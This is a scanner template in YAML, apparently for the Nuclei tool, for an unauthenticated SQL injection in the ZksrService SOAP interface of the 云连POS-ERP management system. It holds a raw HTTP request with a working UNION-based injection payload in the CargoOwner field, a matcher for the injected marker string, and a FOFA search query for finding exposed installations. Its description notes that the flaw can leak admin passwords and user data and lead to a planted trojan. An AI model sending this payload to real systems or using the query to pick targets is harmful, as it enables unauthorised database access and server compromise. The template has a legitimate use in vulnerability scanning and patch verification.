common/config/pocs/allpoc/云连POS-ERP管理系统-ZksrService-SQL注入漏洞.yaml

http:
    - matchers:
        - part: body
          type: word
          words:
            - qpzxqHkNmdRESvCXmdaisAkuTJdrtmjwXAlunmvjAMDpJqpvzq
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /services/ZksrService HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
          Accept-Encoding: gzip, deflate
          Accept-Language: zh-CN,zh;q=0.9
          SOAPAction: ""
          Content-Type: text/xml; charset=UTF-8
          Connection: close

          <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.service.chaosZ.com">
          <soapenv:Header/>
              <soapenv:Body>
                  <web:getItemInfo soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                      <data xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">{"CargoOwner":"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(112)+CHAR(122)+CHAR(120)+CHAR(113)+CHAR(72)+CHAR(107)+CHAR(78)+CHAR(109)+CHAR(100)+CHAR(82)+CHAR(69)+CHAR(83)+CHAR(118)+CHAR(67)+CHAR(88)+CHAR(109)+CHAR(100)+CHAR(97)+CHAR(105)+CHAR(115)+CHAR(65)+CHAR(107)+CHAR(117)+CHAR(84)+CHAR(74)+CHAR(100)+CHAR(114)+CHAR(116)+CHAR(109)+CHAR(106)+CHAR(119)+CHAR(88)+CHAR(65)+CHAR(108)+CHAR(117)+CHAR(110)+CHAR(109)+CHAR(118)+CHAR(106)+CHAR(65)+CHAR(77)+CHAR(68)+CHAR(112)+CHAR(74)+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(122)+CHAR(113),NULL-- qfYz"}
                      </data>
                  </web:getItemInfo>
              </soapenv:Body>
          </soapenv:Envelope>
id: yunlianPOS-ERP-ZksrService-sql
info:
    author: Superhero
    description: |-
        fofa: title="Powered By chaosZ"
        云连POS-ERP管理系统 ZksrService 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 云连POS-ERP管理系统 ZksrService SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/WrdqYJeKKTUYex8ZBM4ZSA?token=1383368913&lang=zh_CN
    severity: high
    tags: []
